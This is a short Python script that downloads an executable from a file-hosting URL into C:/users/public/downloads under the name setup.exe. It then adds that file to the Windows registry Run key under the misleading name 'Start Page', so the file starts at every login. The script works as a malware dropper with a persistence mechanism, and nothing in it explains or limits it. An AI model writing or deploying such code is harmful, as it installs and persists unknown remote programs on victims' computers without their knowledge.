import wget
import winreg


url = "https://srv-file21.gofile.io/downloadStore/srv-store4/maAhtT/main.exe"
wget.download(url, 'c:/users/public/downloads/setup.exe')


keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
except:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
winreg.SetValueEx(key, "Start Page", 0, winreg.REG_SZ, r'c:/users/public/downloads/setup.exe')
winreg.CloseKey(key)

#
# def write(path, value, root=HKEY_CURRENT_USER):
#     path, name = os.path.split(path)
#     with OpenKey(root, path, 0, KEY_WRITE) as key:
#         SetValueEx(key, name, 0, REG_SZ, value)
